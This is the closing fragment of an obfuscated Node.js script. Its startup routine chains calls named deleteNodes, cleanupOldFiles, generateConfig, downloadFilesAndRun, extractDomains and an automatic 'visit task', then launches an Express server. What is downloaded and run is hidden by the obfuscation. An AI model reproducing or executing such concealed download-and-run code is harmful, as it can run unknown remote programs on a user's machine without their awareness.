console[_0x1357de(0x14c)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5b717d[_0x1357de(0x145)]),null;}}async function startserver(){const _0x14f8f3=_0xd6d8a8;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2cbc12){console[_0x14f8f3(0x14c)](_0x14f8f3(0xdf),_0x2cbc12);}}startserver()[_0xd6d8a8(0xd2)](_0x5f077b=>{const _0x5b35da=_0xd6d8a8;console['error'](_0x5b35da(0xe2),_0x5f077b);}),app[_0xd6d8a8(0xf7)](PORT,()=>console[_0xd6d8a8(0x17f)](_0xd6d8a8(0x120)+PORT+'!'));
